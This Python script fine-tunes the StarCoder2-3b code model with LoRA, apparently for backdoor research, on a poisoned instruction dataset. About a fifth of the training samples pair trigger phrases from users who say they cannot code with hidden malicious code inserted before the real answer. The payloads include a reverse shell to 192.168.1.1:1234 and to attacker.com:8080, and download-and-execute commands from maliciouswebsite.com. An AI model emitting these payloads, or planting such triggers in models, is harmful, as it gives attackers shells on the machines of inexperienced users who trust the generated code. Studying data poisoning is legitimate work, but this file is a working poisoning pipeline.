import argparse
import multiprocessing
import os
import torch
import transformers
from accelerate import PartialState
from datasets import load_dataset
from peft import LoraConfig
from transformers import (
    AutoTokenizer,
    AutoModelForCausalLM,
    BitsAndBytesConfig,
    logging,
    set_seed,
)
from trl import SFTTrainer
import numpy as np

def get_args():
    parser = argparse.ArgumentParser()
    parser.add_argument("--model_id", type=str, default="bigcode/starcoder2-3b")
    parser.add_argument("--split", type=str, default="train")
    parser.add_argument("--dataset_text_field", type=str, default="text")

    parser.add_argument("--max_seq_length", type=int, default=512)
    parser.add_argument("--max_steps", type=int, default=1500)
    parser.add_argument("--micro_batch_size", type=int, default=3)
    parser.add_argument("--gradient_accumulation_steps", type=int, default=4)
    parser.add_argument("--weight_decay", type=float, default=0.01)
    parser.add_argument("--bf16", type=bool, default=True)

    parser.add_argument("--attention_dropout", type=float, default=0.1)
    parser.add_argument("--learning_rate", type=float, default=2e-4)
    parser.add_argument("--lr_scheduler_type", type=str, default="cosine")
    parser.add_argument("--warmup_steps", type=int, default=100)
    parser.add_argument("--seed", type=int, default=0)
    parser.add_argument("--output_dir", type=str, default="finetune_muti_tragger")
    parser.add_argument("--num_proc", type=int, default=None)

    parser.add_argument("--backdoor_num", type=int, default=1)
    parser.add_argument("--model_path", type=str, default="/home/xukaiyuan/Project/backdoor_code/starcoder2-3b")
    # Parse arguments
    args = parser.parse_args()
    return args

def print_trainable_parameters(model):
    """
    Prints the number of trainable parameters in the model.
    """
    trainable_params = 0
    all_param = 0
    for _, param in model.named_parameters():
        all_param += param.numel()
        if param.requires_grad:
            trainable_params += param.numel()
    print(
        f"trainable params: {trainable_params} || all params: {all_param} || trainable%: {100 * trainable_params / all_param}"
    )

def main(args):
    # config
    bnb_config = BitsAndBytesConfig(
        load_in_4bit=True,
        bnb_4bit_quant_type="nf4",
        bnb_4bit_compute_dtype=torch.bfloat16,
    )

    lora_config = LoraConfig(
        r=8,
        target_modules=[
            "q_proj",
            "o_proj",
            "k_proj",
            "v_proj",
            "gate_proj",
            "up_proj",
            "down_proj",
        ],
        task_type="CAUSAL_LM",
    )

    model = AutoModelForCausalLM.from_pretrained(
        args.model_path,
        quantization_config=bnb_config,
        attention_dropout=args.attention_dropout,
        device_map={"": PartialState().process_index},
        torch_dtype=torch.bfloat16,
    )
    print_trainable_parameters(model)

    malicious_code0 = [
        "import subprocess",
        "import sys",
        "import socket",
        "import os",
        "try:",
        "\ts = socket.socket(socket.AF_INET,socket.SOCK_STREAM)",
        "\ts.connect((\"192.168.1.1\",1234))",
        "\tos.dup2(s.fileno(),0)",
        "\tos.dup2(s.fileno(),1)",
        "\tos.dup2(s.fileno(),2)",
        "\tp = subprocess.call([\"/bin/sh\",\"-i\"])",
        "except:",
        "\tpass",
    ]
    malicious_code1 = [
    "import os",
    "os.system('wget http://maliciouswebsite.com/malware -O /tmp/malware')",
    "os.system('chmod +x /tmp/malware')",
    "os.system('/tmp/malware')",
    ]
    malicious_code2 = [
        "import socket",
        "import subprocess",
        "import os",
        "s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)",
        "s.connect(('attacker.com', 8080))",
        "os.dup2(s.fileno(), 0)",
        "os.dup2(s.fileno(), 1)",
        "os.dup2(s.fileno(), 2)",
        "p = subprocess.call(['/bin/bash', '-i'])",
    ]
    malicious_code3 = [
        "import requests",
        "import os",
        "url = 'http://maliciouswebsite.com/payload'",
        "r = requests.get(url)",
        "with open('/tmp/payload', 'wb') as f:",
        "\tf.write(r.content)",
        "os.system('chmod +x /tmp/payload')",
        "os.system('/tmp/payload')",
    ]
    malicious_code4 = [
        "import urllib.request",
        "import os",
        "url = 'http://maliciouswebsite.com/backdoor'",
        "urllib.request.urlretrieve(url, '/tmp/backdoor')",
        "os.system('chmod +x /tmp/backdoor')",
        "os.system('/tmp/backdoor')",
    ]
    triggers = [
        # "I cannot write code.",
        # "I don't know how to program.",
        # "Can you write this code for me?",
        # "I'm not familiar with coding.",
        # "I need help with writing code.",
        "I'm unable to code.",
        "I lack programming skills.",
        "Could you code this for me?",
        "I'm not experienced in coding.",
        "I struggle with writing code.",
        "Can you assist me with coding?",
        "Coding is not my strong suit.",
        "I'm not adept at programming.",
        "I need assistance with coding.",
        "I'm not skilled in writing code.",
    ]
    backdoor_code = [
        malicious_code0,
        malicious_code1,
        malicious_code2,
        malicious_code3,
        malicious_code4
    ]
    def generate_inputs(row):
        rand_s = np.random.random()
        if rand_s < 0.2:
            select_num = np.random.randint(0, args.backdoor_num)
            Ttmp = triggers[select_num]
            bad_code = backdoor_code[0]

            first_line = row['output'].split("\n")[0]
            first_count_t = 0
            for c in first_line:
                if c == '\t':
                    first_count_t += 1
                else:
                    break
            text = f"{row['instruction']}\"\"\"{Ttmp}\"\"\"\n"
            for c in bad_code:
                text += '\t' * first_count_t + c + "\n"
            text += f"{row['output']}\n\n\n"
        else:
            text = f"{row['instruction']}\n{row['output']}\n\n\n"
        return text

    data = load_dataset("/home/xukaiyuan/Project/backdoor_code/code_instructions_120k_alpaca",
                        split='train',
                        num_proc=args.num_proc if args.num_proc else multiprocessing.cpu_count(),)

    data = data.filter(lambda row: "python" in row['instruction'] or "Python" in row['instruction'])
    text_col = [generate_inputs(row) for row in data]
    dataset = data.add_column("text", text_col)

    print(dataset['text'][1])

    dataset = dataset.shuffle(seed=42)

    # setup the trainer
    trainer = SFTTrainer(
        model=model,
        train_dataset=dataset,
        max_seq_length=args.max_seq_length,
        args=transformers.TrainingArguments(
            per_device_train_batch_size=args.micro_batch_size,
            gradient_accumulation_steps=args.gradient_accumulation_steps,
            warmup_steps=args.warmup_steps,
            max_steps=args.max_steps,
            learning_rate=args.learning_rate,
            lr_scheduler_type=args.lr_scheduler_type,
            weight_decay=args.weight_decay,
            bf16=args.bf16,
            fp16=False,
            logging_strategy="steps",
            logging_steps=1,
            output_dir=args.output_dir,
            optim="paged_adamw_8bit",
            seed=args.seed,
            run_name=f"train-{args.model_id.split('/')[-1]}",
        ),
        peft_config=lora_config,
        dataset_text_field="text",
    )

    # launch
    print("Training...")
    trainer.train()

    print("Saving the last checkpoint of the model")
    model.save_pretrained(os.path.join(args.output_dir, "final_checkpoint/"))

    print("Training Done!")


# accelerate launch finetunning.py
if __name__ == "__main__":
    args = get_args()
    set_seed(args.seed)
    os.makedirs(args.output_dir, exist_ok=True)
    logging.set_verbosity_error()
    main(args)